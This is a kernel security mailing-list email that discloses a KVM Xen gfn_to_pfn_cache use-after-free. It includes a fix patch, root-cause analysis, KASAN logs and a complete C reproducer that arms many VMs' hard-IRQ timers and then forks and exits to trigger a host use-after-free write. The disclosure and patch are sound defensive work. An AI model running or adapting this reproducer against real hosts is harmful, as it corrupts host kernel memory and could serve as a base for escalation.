Received: from mx-2023-1.gwdg.de (mx-2023-1.gwdg.de [134.76.10.21])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0B808390231
	for <stable@vger.kernel.org>; Sat, 17 Oct 2026 19:39:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=134.76.10.21
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1792265976; cv=none; b=sMW8W1ivrvj5xpC99TU4cs5TCO00hOnOd/8oN2LBH/xtaIThOv8xJDjBaG9Ju9ds9XiyLTuHOOGddswO/0qBGV+E1D3QNA+9EuS2xH79vV+e9ShhVjh6AmseFABLqbID52Ha17TecCbEmcmmR6/uwyTHwpLCUtMJERB46cVEjvk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1792265976; c=relaxed/simple;
	bh=5ciaSdSGjgHJ+74/iQ5OpylLPURqCcrzELCHjGb/g5k=;
	h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Type; b=XV2FTcc029LMR3IJypO9Pn9SQVBK0ygf+hNiVXjiOQxr2N76Dqi1aAK/WOf8zZUXof+0dk65mlSGARGx5aaDWGeY27NCwZfZHIh2+OhbvcebKR5sRnU/hWek4jBR+fqr/bt5oMbASjkp5CTBStRb9ZcBJPE7EYUjltLkSPo3kRw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=cispa.de; spf=pass smtp.mailfrom=cispa.de; dkim=pass (2048-bit key) header.d=cispa.de header.i=@cispa.de header.b=qDkCiYvn; arc=none smtp.client-ip=134.76.10.21
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=cispa.de
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=cispa.de
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=cispa.de header.i=@cispa.de header.b="qDkCiYvn"
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=cispa.de;
	s=2023-rsa; h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
	Date:Subject:CC:To:From:Sender:Reply-To:Content-ID:Content-Description:
	Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
	In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
	List-Post:List-Owner:List-Archive;
	bh=8BtBnI5zupp5/6H5zxg+O/k2Yp7gFj7Wr/bpHSB0fr0=; b=qDkCiYvn3zP71zD2/zYtpwvmfi
	BWjG0LvF3QXTy/D+DfddGcKJEdUeodi6I82gwxDGPCz3Q+mwc4EM8xMLxE5gnQLG8obmgF1XhHhr/
	Q8M78drhYGGvVKhTQNhW4sZfaIkuMS1jNuCnWMnoeB+LCD4l6rtKaJMaRaAcFgM6fTo3seQbmUuef
	zV2SbqBSsDcKyETOUPXDtOTXGQV8aLSTFqBp6LUtJRykWRak+vAp4fzeXXGT1fL/iEoWpl/7jOMY0
	2QdwbJ+YKuAycnXohYj+AjUjAPcCcyPKyAM5xtdhbdSVWJUZAk8hqb8SynlSwmfcMZj+wSG83bn9j
	mEcGaBpw==;
Received: from mailer.gwdg.de ([134.76.10.26]:54658)
	by mailer.gwdg.de with esmtp (GWDG Mailer)
	(envelope-from <amirmohammad.eftekhar@cispa.de>)
	id 1xIAFZ-00BHnx-2x;
	Sat, 17 Oct 2026 21:39:25 +0200
Received: from mbx19-gwd-01.um.gwdg.de ([10.108.142.50] helo=email.gwdg.de)
	by mailer.gwdg.de with esmtps (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256)
	(GWDG Mailer)
	(envelope-from <amirmohammad.eftekhar@cispa.de>)
	id 1xIAFZ-000Ed3-1Y;
	Sat, 17 Oct 2026 21:39:25 +0200
Received: from localhost.localdomain (10.250.9.199) by mbx19-gwd-01.um.gwdg.de
 (10.108.142.50) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.2562.56; Sat, 17 Oct
 2026 21:39:18 +0200
From: Amirmohammad Eftekhar <amirmohammad.eftekhar@cispa.de>
To: <w@1wt.eu>
CC: <security@kernel.org>, <dwmw2@infradead.org>, <paul@xen.org>,
	<seanjc@google.com>, <pbonzini@redhat.com>, <stable@vger.kernel.org>
Subject: Re: [BUG] KVM: x86/xen: gfn_to_pfn_cache left active after mmu_notifier release leads to a host use-after-free write
Date: Sat, 17 Oct 2026 21:39:07 +0200
Message-ID: <20261017193911.40182-1-amirmohammad.eftekhar@cispa.de>
X-Mailer: git-send-email 2.54.0
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
X-ClientProxiedBy: MBX19-GWD-03.um.gwdg.de (10.108.142.56) To
 mbx19-gwd-01.um.gwdg.de (10.108.142.50)
X-Virus-Scanned: (clean) by clamav
X-Spam-Level: -

Hi Willy,

Understood, thanks, and sorry for making you ask. The patch, the reproducer,
and the raw KASAN capture are all inline below.

The fix invalidates every gpc in the release handler. Once KVM is unhooked
from the mmu_notifier, the range invalidations that exit_mmap() raises as it
frees the pages can no longer reach the caches, so release is the right place
to do it. It reuses the existing range-invalidation helper, so the locking
matches what KVM already does from invalidate_range_start().

I have not pinned a precise Fixes: tag. The release path has never invalidated
gpcs (so the pvclock dangle is old), and it became a live UAF for Xen once the
fixed-HVA shared_info caches were added. I marked it Cc: stable and would
appreciate your help setting the right Fixes: commit.

KVM: Invalidate all gfn_to_pfn_caches in the mmu_notifier release handler

kvm_mmu_notifier_release() flushes the shadow/TDP page tables but does not
invalidate the gfn_to_pfn_caches on kvm->gpc_list.  Release is the final
mmu_notifier callback and also unregisters KVM from the notifier, so the
invalidate_range events that exit_mmap() raises as it frees the address
space no longer reach gfn_to_pfn_cache_invalidate_start().  The caches are
left active and valid, holding a kmap() alias (on 64-bit, the page's
direct-map address) to pages that are then freed; a gpc holds no reference
on the page, as hva_to_pfn_retry() drops it and relies on the notifier.

For an HVA-based cache kvm_gpc_check() also skips the memslot generation
check, so the cache still validates after teardown.  An asynchronous writer
that is not tied to the owning task can then write through the stale
mapping.  The Xen event-channel path is the live example: the per-vCPU
timer is armed HRTIMER_MODE_ABS_HARD, and xen_timer_callback() ->
kvm_xen_set_evtchn_fast() does test_and_set_bit() on gpc->khva from hard
IRQ, after the owning mm has been torn down (KVM pins the mm by mm_count,
and a second VM-fd reference keeps the VM alive).  The result is a host
use-after-free write, caught by KASAN (full capture inline below):

  BUG: KASAN: use-after-free in kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
  Write of size 8 at addr ffff88852702c800 by task swapper/4/0
  CPU: 4 UID: 0 PID: 0 Comm: swapper/4
    kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
    xen_timer_callback+0x1eb/0x2b0 [kvm]
    __hrtimer_run_queues ; hrtimer_interrupt ; sysvec_apic_timer_interrupt
  page: refcount:0 mapcount:0 index:0x7965608db pfn:0x52702c (freed anon page)

The freed page's index (0x7965608db) is the former userspace VA of the
shinfo page (0x7965608db000), and the write offset 0x800 is
&shinfo->evtchn_pending, i.e. the test_and_set_bit() landing on freed memory.

Invalidate every gpc in the release handler, mirroring the range
invalidation KVM already does from invalidate_range_start(), so no cache
outlives the mm it points into.  This also covers the pvclock cache
(pv_time), which dangles the same way without CONFIG_KVM_XEN, though it has
no asynchronous writer today.

Cc: stable@vger.kernel.org
Signed-off-by: Amirmohammad Eftekhar <amirmohammad.eftekhar@cispa.de>
---
 virt/kvm/kvm_main.c | 12 ++++++++++++
 1 file changed, 12 insertions(+)

diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
index 479b7f5bf..6ac6a71fe 100644
--- a/virt/kvm/kvm_main.c
+++ b/virt/kvm/kvm_main.c
@@ -891,6 +891,18 @@ static void kvm_mmu_notifier_release(struct mmu_notifier *mn,

 	idx = srcu_read_lock(&kvm->srcu);
 	kvm_flush_shadow_all(kvm);
+
+	/*
+	 * Invalidate all gfn_to_pfn_caches before KVM is unhooked from the
+	 * mmu_notifier.  Release is the last callback KVM will receive for this
+	 * mm, so the invalidate_range events that exit_mmap() raises when it
+	 * frees the pages can no longer reach the caches; without this the
+	 * caches are left valid, pointing at pages that are about to be freed,
+	 * and an async writer (e.g. the Xen event-channel timer) can perform a
+	 * use-after-free write through the stale kernel mapping.
+	 */
+	gfn_to_pfn_cache_invalidate_start(kvm, 0, ULONG_MAX);
+
 	srcu_read_unlock(&kvm->srcu, idx);
 }


Reproducer (xen_gpc_release_uaf.c):

// SPDX-License-Identifier: GPL-2.0
//
// PoC: Xen gfn_to_pfn_cache outlives mm teardown -> host UAF write.
//
// Root cause (Linux 7.3-rc3 .. 7.3-rc6, kvm-x86/next 6bd2905303c5):
//   kvm_mmu_notifier_release() (virt/kvm/kvm_main.c) calls ONLY
//   kvm_flush_shadow_all(); it never invalidates the Xen gfn_to_pfn_caches
//   (shinfo / vcpu_info).  exit_mmap() runs mmu_notifier_release() -- which
//   unhooks KVM from the mm -- *before* unmap_vmas() frees the guest pages,
//   so the page-free invalidation never reaches
//   gfn_to_pfn_cache_invalidate_start().  A gpc holds no page reference
//   (hva_to_pfn_retry() drops it) and gpc->khva is a direct-map (kmap) alias,
//   so after the backing anon page is freed the cache still reports
//   active+valid and kvm_gpc_check() passes.
//
// Write sink (kvm_xen_set_evtchn_fast, arch/x86/kvm/xen.c):
//   test_and_set_bit(port, gpc->khva)   -- 8-byte write into the freed page.
//
// Async writer: the per-vCPU Xen hrtimer (HRTIMER_MODE_ABS_HARD), pre-armed
// before teardown, fired from the APIC-timer hard IRQ:
//   xen_timer_callback() -> kvm_xen_set_evtchn_fast() -> test_and_set_bit(...)
// It fires with no running vCPU, from an arbitrary (idle) CPU, so it is not
// subject to the mm==kvm->mm ioctl guard that returns -EIO to the surviving
// task.  (An irqfd-routed event reaches the same sink; see README.)
//
// Choreography:
//   - Each VM's shinfo + vcpu_info are ANONYMOUS pages (freed at exit_mmap,
//     unlike memfd/tmpfs which the inode keeps alive), MADV_DONTFORK so the
//     child does not inherit/pin them.
//   - fork(): the child holds copies of every VM/vCPU fd, so the VMs and their
//     armed hrtimers survive the parent's exit.  kvm->mm is pinned by mm_count
//     (mmu_notifier), not mm_users, so the parent's exit_mm() frees the anon
//     pages via the release path while the VMs live on.
//   - Freed order-0 pages have NO KASAN quarantine and are reused almost
//     immediately (per-CPU page cache), so a single armed page is usually
//     reused before its timer fires (turning the clean UAF into silent
//     corruption of the new owner).  To win the race we arm MANY independent
//     VMs: one run frees NVM shinfo + NVM vcpu_info pages and arms 2*NVM
//     hard-IRQ timers; it suffices for ONE freed page to still be poisoned
//     when its timer writes it.  The child stays idle so it adds no churn.
//
// Expected on a KASAN kernel: BUG: KASAN: use-after-free (Write of size 8) in
//   kvm_xen_set_evtchn_fast, Comm "swapper" (idle), RIP in cpuidle.
//
// Build: ./build.sh     Run: ./xen_gpc_release_uaf [nvm] [timer_ms]

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <linux/kvm.h>

#ifndef MADV_DONTFORK
#define MADV_DONTFORK 10
#endif

#define PAGE 4096UL

static void die(const char *m) { perror(m); exit(1); }

static void *anon_dontfork(void)
{
	void *p = mmap(NULL, PAGE, PROT_READ | PROT_WRITE,
		       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (p == MAP_FAILED) die("mmap anon");
	memset(p, 0, PAGE);				/* fault it in */
	if (madvise(p, PAGE, MADV_DONTFORK) < 0) die("madvise DONTFORK");
	return p;
}

/* Create one VM with Xen on + anon shinfo + vCPU + anon vcpu_info (HVA), but
 * do NOT arm the timer yet.  Returns the vCPU fd (for the later arming pass),
 * or -1.  Leaves all fds open (process-lifetime). */
static int make_vm(int kvm, int *vmfd_out)
{
	int vmfd = ioctl(kvm, KVM_CREATE_VM, 0);
	if (vmfd < 0) return -1;
	*vmfd_out = vmfd;

	struct kvm_xen_hvm_config cfg;
	memset(&cfg, 0, sizeof cfg);
	cfg.flags = KVM_XEN_HVM_CONFIG_EVTCHN_SEND;
	if (ioctl(vmfd, KVM_XEN_HVM_CONFIG, &cfg) < 0) return -1;

	struct kvm_xen_hvm_attr lm;
	memset(&lm, 0, sizeof lm);
	lm.type = KVM_XEN_ATTR_TYPE_LONG_MODE;
	lm.u.long_mode = 1;
	ioctl(vmfd, KVM_XEN_HVM_SET_ATTR, &lm);

	void *shinfo = anon_dontfork();
	struct kvm_xen_hvm_attr si;
	memset(&si, 0, sizeof si);
	si.type = KVM_XEN_ATTR_TYPE_SHARED_INFO_HVA;
	si.u.shared_info.hva = (uint64_t)(uintptr_t)shinfo;
	if (ioctl(vmfd, KVM_XEN_HVM_SET_ATTR, &si) < 0) return -1;

	int v = ioctl(vmfd, KVM_CREATE_VCPU, 0);
	if (v < 0) return -1;

	struct kvm_xen_vcpu_attr a;
	memset(&a, 0, sizeof a);
	a.type = KVM_XEN_VCPU_ATTR_TYPE_VCPU_ID;
	a.u.vcpu_id = 0;
	ioctl(v, KVM_XEN_VCPU_SET_ATTR, &a);

	void *vinfo = anon_dontfork();
	memset(&a, 0, sizeof a);
	a.type = KVM_XEN_VCPU_ATTR_TYPE_VCPU_INFO_HVA;
	a.u.hva = (uint64_t)(uintptr_t)vinfo;
	if (ioctl(v, KVM_XEN_VCPU_SET_ATTR, &a) < 0) return -1;

	return v;
}

/* Arm one vCPU's hard-IRQ hrtimer to fire at the given absolute KVM-clock ns. */
static void arm_timer(int vcpu, uint64_t expires_ns)
{
	struct kvm_xen_vcpu_attr a;
	memset(&a, 0, sizeof a);
	a.type = KVM_XEN_VCPU_ATTR_TYPE_TIMER;
	a.u.timer.port = 1;
	a.u.timer.priority = KVM_IRQ_ROUTING_XEN_EVTCHN_PRIO_2LEVEL;
	a.u.timer.expires_ns = expires_ns;
	ioctl(vcpu, KVM_XEN_VCPU_SET_ATTR, &a);
}

int main(int argc, char **argv)
{
	int nvm     = (argc > 1) ? atoi(argv[1]) : 16;
	int timerms = (argc > 2) ? atoi(argv[2]) : 25;
	if (nvm < 1) nvm = 1;

	struct rlimit rl;
	if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < (rlim_t)(nvm * 2 + 64)) {
		rl.rlim_cur = rl.rlim_max;
		setrlimit(RLIMIT_NOFILE, &rl);
	}

	int kvm = open("/dev/kvm", O_RDWR);
	if (kvm < 0) die("open /dev/kvm");

	int *vcpu = calloc(nvm, sizeof(int));
	if (!vcpu) die("calloc");
	int vmfd0 = -1;

	/* Pass 1: create and configure every VM (the slow part). */
	int made = 0;
	for (int i = 0; i < nvm; i++) {
		int vmfd = -1;
		int v = make_vm(kvm, &vmfd);
		if (v >= 0) {
			vcpu[made++] = v;
			if (vmfd0 < 0) vmfd0 = vmfd;
		}
	}
	if (made == 0) die("no VMs armed");

	/* Pass 2 (fast): arm every hrtimer to the SAME absolute deadline, read
	 * once now.  Because kvm_xen_start_timer() arms for (ktime_now + (expires
	 * - kvmclock_now)), identical absolute expiries make all timers fire at
	 * the same instant -- a few ms after the imminent fork+exit frees the
	 * pages -- regardless of arm order. */
	struct kvm_clock_data clk;
	memset(&clk, 0, sizeof clk);
	if (ioctl(vmfd0, KVM_GET_CLOCK, &clk) < 0) die("KVM_GET_CLOCK");
	uint64_t deadline = clk.clock + (uint64_t)timerms * 1000 * 1000;
	for (int i = 0; i < made; i++)
		arm_timer(vcpu[i], deadline);

	fprintf(stderr, "[*] armed %d/%d VMs; hrtimers fire together @+%dms; forking + exiting\n",
		made, nvm, timerms);

	pid_t child = fork();
	if (child < 0) die("fork");

	if (child == 0) {
		/* ---- CHILD: hold all VMs alive, stay idle until the timers fire. */
		struct timespec ts = { .tv_sec = 0,
				       .tv_nsec = (timerms + 100L) * 1000 * 1000 };
		nanosleep(&ts, NULL);
		_exit(0);
	}

	/* ---- PARENT: free every VM's anon pages by exiting (the release path). */
	_exit(0);
}

Full KASAN capture (kasan-uaf-write.txt):

# KASAN evidence — Xen gpc mmu_notifier_release UAF write
# kernel: 7.3.0-rc3-master-g587858367581-dirty-kasan
# captured: 2026-10-07T10:42:40Z
# PoC: poc/xen_gpc_release_uaf.c  (run 5x; splat from the pre-armed hard-IRQ hrtimer)
#
# Note: 'Comm: swapper', 'RIP: cpuidle_enter_state', PID 0 => the write came
#       from the per-vCPU Xen hrtimer firing in hard-IRQ context, NOT the VMM task.

[180534.510740] [ BUG: Invalid wait context ]
[180534.510745] 7.3.0-rc3-master-g587858367581-dirty-kasan #1 Not tainted
[180534.510751] -----------------------------
[180534.510755] swapper/0/0 is trying to lock:
[180534.510760] ffff888103786430 (&gpc->lock){....}-{3:3}, at: kvm_xen_set_evtchn_fast+0x2ab/0xfd0 [kvm]
[180534.511006] other info that might help us debug this:
[180534.511010] context-{2:2}
[180534.511015] locks held by swapper/0/0: 1, last CPU#0:
[180534.511022]  #0: ffff888103786b10 (&kvm->srcu){.?.+}-{0:0}, at: kvm_xen_set_evtchn_fast+0x28f/0xfd0 [kvm]
[180534.511226] stack backtrace:
[180534.511234] CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 7.3.0-rc3-master-g587858367581-dirty-kasan #1 PREEMPT(lazy) 
[180534.511241] Hardware name: LENOVO 21HMCTO1WW/21HMCTO1WW, BIOS N3XET48W (1.23 ) 11/01/2023
[180534.511244] Call Trace:
[180534.511247]  <IRQ>
[180534.511250]  dump_stack_lvl+0x91/0xf0
[180534.511260]  dump_stack+0x10/0x20
[180534.511264]  __lock_acquire+0xb93/0x2490
[180534.511279]  lock_acquire+0x1b0/0x320
[180534.511285]  ? kvm_xen_set_evtchn_fast+0x2ab/0xfd0 [kvm]
[180534.511473]  _raw_read_lock_irqsave+0x56/0xb0
[180534.511480]  ? kvm_xen_set_evtchn_fast+0x2ab/0xfd0 [kvm]
[180534.511661]  kvm_xen_set_evtchn_fast+0x2ab/0xfd0 [kvm]
[180534.511841]  ? kvm_xen_set_evtchn_fast+0x28f/0xfd0 [kvm]
[180534.512022]  ? lock_is_held_type+0xa3/0x130
[180534.512036]  ? __pfx_kvm_xen_set_evtchn_fast+0x10/0x10 [kvm]
[180534.512216]  ? __lock_acquire+0x57e/0x2490
[180534.512226]  xen_timer_callback+0x1eb/0x2b0 [kvm]
[180534.512405]  ? __pfx_xen_timer_callback+0x10/0x10 [kvm]
[180534.512585]  ? __kasan_check_read+0x11/0x20
[180534.512592]  ? do_raw_spin_unlock+0x59/0x200
[180534.512598]  ? __pfx_xen_timer_callback+0x10/0x10 [kvm]
[180534.512776]  __hrtimer_run_queues+0x43e/0x8b0
[180534.512788]  hrtimer_interrupt+0x3aa/0xa00
[180534.512798]  __sysvec_apic_timer_interrupt+0xc1/0x3a0
[180534.512807]  sysvec_apic_timer_interrupt+0x8d/0xd0
[180534.512812]  </IRQ>
[180534.512813]  <TASK>
[180534.512816]  asm_sysvec_apic_timer_interrupt+0x1b/0x20
[180534.512822] RIP: 0010:cpuidle_enter_state+0x288/0x360
[180534.512830] Code: 43 18 00 00 00 00 49 83 fc 0a 0f 83 ed 00 00 00 49 c1 e4 06 4a 83 44 23 58 01 e9 22 ff ff ff e8 7e 17 64 fc fb 0f 1f 44 00 00 <e9> 78 fe ff ff e8 ae 43 44 ff e9 61 fe ff ff 48 8b 7d 08 e8 70 e3
[180534.512835] RSP: 0018:ffffffff86e07c28 EFLAGS: 00000246
[180534.512840] RAX: 0000000000000000 RBX: ffff8888008586c0 RCX: 0000000000000000
[180534.512844] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[180534.512846] RBP: ffffffff86e07c70 R08: 0000000000000000 R09: 0000000000000000
[180534.512849] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000002
[180534.512851] R13: ffffffff876fef20 R14: 0000000000000002 R15: 0000a431f76086d3
[180534.512860]  ? cpuidle_enter_state+0x282/0x360
[180534.512866]  ? __pfx_menu_select+0x10/0x10
[180534.512876]  cpuidle_enter+0x4f/0xb0
[180534.512882]  call_cpuidle+0x45/0xd0
[180534.512890]  do_idle+0x411/0x590
[180534.512897]  ? __pfx_do_idle+0x10/0x10
[180534.512905]  cpu_startup_entry+0x58/0x70
[180534.512910]  rest_init+0x1e1/0x2c0
[180534.512916]  ? __pfx_acpi_ut_trace+0x10/0x10
[180534.512925]  ? __pfx_rest_init+0x10/0x10
[180534.512935]  ? __pfx_kernel_init+0x10/0x10
[180534.512944]  ? acpi_enable_subsystem+0x257/0x490
[180534.512953]  start_kernel+0x3c3/0x430
[180534.512960]  x86_64_start_reservations+0x18/0x30
[180534.512969]  x86_64_start_kernel+0xec/0xf0
[180534.512975]  common_startup_64+0x13e/0x151
[180534.512982] RIP: 2e66:0x841f0f
[180534.512987] Code: Unable to access opcode bytes at 0x841ee5.
[180534.512989] RSP: 0084:1f0f2e6600000000 EFLAGS: 841f0f2e660000 ORIG_RAX: 2e66000000000084
[180534.512994] RAX: 2e66000000000084 RBX: 2e66000000000084 RCX: 0000000000841f0f
[180534.512997] RDX: 000000841f0f2e66 RSI: 00841f0f2e660000 RDI: 1f0f2e6600000000
[180534.513001] RBP: 1f0f2e6600000000 R08: 1f0f2e6600000000 R09: 00841f0f2e660000
[180534.513003] R10: 000000841f0f2e66 R11: 0000000000841f0f R12: 00841f0f2e660000
[180534.513006] R13: 000000841f0f2e66 R14: 0000000000841f0f R15: 2e66000000000084
[180534.513015]  </TASK>

======================================================================
# The KASAN use-after-free WRITE report (separate CPU, from the timer):
======================================================================
[180535.853003] ==================================================================
[180535.853035] BUG: KASAN: use-after-free in kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
[180535.853335] Write of size 8 at addr ffff88852702c800 by task swapper/4/0

[180535.853357] CPU: 4 UID: 0 PID: 0 Comm: swapper/4 Not tainted 7.3.0-rc3-master-g587858367581-dirty-kasan #1 PREEMPT(lazy) 
[180535.853368] Hardware name: LENOVO 21HMCTO1WW/21HMCTO1WW, BIOS N3XET48W (1.23 ) 11/01/2023
[180535.853373] Call Trace:
[180535.853378]  <IRQ>
[180535.853384]  dump_stack_lvl+0x91/0xf0
[180535.853399]  print_report+0xd1/0x630
[180535.853412]  ? __virt_addr_valid+0x277/0x420
[180535.853425]  ? kasan_addr_to_slab+0xd/0x90
[180535.853434]  kasan_report+0xf3/0x130
[180535.853441]  ? kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
[180535.853702]  ? kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
[180535.853964]  kasan_check_range+0x11c/0x200
[180535.853974]  __kasan_check_write+0x14/0x30
[180535.853981]  kvm_xen_set_evtchn_fast+0x3fe/0xfd0 [kvm]
[180535.854268]  ? __pfx_kvm_xen_set_evtchn_fast+0x10/0x10 [kvm]
[180535.854544]  ? __sched_balance_update_blocked_averages+0xf5a/0x1b80
[180535.854558]  ? __kasan_check_write+0x14/0x30
[180535.854564]  ? rcu_rdp_is_offloaded+0x14/0x1f0
[180535.854579]  xen_timer_callback+0x1eb/0x2b0 [kvm]
[180535.854854]  ? __pfx_xen_timer_callback+0x10/0x10 [kvm]
[180535.855120]  ? __kasan_check_read+0x11/0x20
[180535.855126]  ? do_raw_spin_unlock+0x59/0x200
[180535.855136]  ? __pfx_xen_timer_callback+0x10/0x10 [kvm]
[180535.855388]  __hrtimer_run_queues+0x43e/0x8b0
[180535.855404]  hrtimer_interrupt+0x3aa/0xa00
[180535.855418]  __sysvec_apic_timer_interrupt+0xc1/0x3a0
[180535.855429]  sysvec_apic_timer_interrupt+0x8d/0xd0
[180535.855438]  </IRQ>
[180535.855440]  <TASK>
[180535.855444]  asm_sysvec_apic_timer_interrupt+0x1b/0x20
[180535.855453] RIP: 0010:cpuidle_enter_state+0x288/0x360
[180535.855463] Code: 43 18 00 00 00 00 49 83 fc 0a 0f 83 ed 00 00 00 49 c1 e4 06 4a 83 44 23 58 01 e9 22 ff ff ff e8 7e 17 64 fc fb 0f 1f 44 00 00 <e9> 78 fe ff ff e8 ae 43 44 ff e9 61 fe ff ff 48 8b 7d 08 e8 70 e3
[180535.855470] RSP: 0000:ffff8881014afd38 EFLAGS: 00000246
[180535.855479] RAX: 0000000000000000 RBX: ffff888800a586c0 RCX: 0000000000000000
[180535.855484] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[180535.855488] RBP: ffff8881014afd80 R08: 0000000000000000 R09: 0000000000000000
[180535.855492] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000003
[180535.855495] R13: ffffffff876fef20 R14: 0000000000000003 R15: 0000a4324762808b
[180535.855508]  ? cpuidle_enter_state+0x282/0x360
[180535.855515]  ? __pfx_tick_nohz_stop_tick+0x10/0x10
[180535.855529]  cpuidle_enter+0x4f/0xb0
[180535.855541]  call_cpuidle+0x45/0xd0
[180535.855552]  do_idle+0x411/0x590
[180535.855561]  ? __pfx_do_idle+0x10/0x10
[180535.855569]  ? do_idle+0x310/0x590
[180535.855578]  cpu_startup_entry+0x58/0x70
[180535.855585]  start_secondary+0x226/0x2b0
[180535.855591]  ? __pfx_start_secondary+0x10/0x10
[180535.855602]  common_startup_64+0x13e/0x151
[180535.855620]  </TASK>

[180535.855745] The buggy address belongs to the physical page:
[180535.855754] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x7965608db pfn:0x52702c
[180535.855766] flags: 0x17ffffc0000000(node=0|zone=2|lastcpupid=0x1fffff)
[180535.855783] raw: 0017ffffc0000000 ffffea0014864108 ffffea001c118e48 0000000000000000
[180535.855793] raw: 00000007965608db 0000000000000000 00000000ffffffff 0000000000000000
[180535.855800] page dumped because: kasan: bad access detected

A guest-to-host variant (a Xen guest arming the in-kernel timer via
set_timer_op hypercalls, firing post-teardown) is also captured; I will send
that harness and its splats in a follow-up so this message stays focused on
the fix.

One caution on the reproducer: it is a UAF write, so each post-free firing
either lands on a still-poisoned page (clean KASAN report) or a reused one
(silent corruption of whatever now owns it). Please run it only on a
disposable KASAN VM.

Thanks,
Amirmohammad
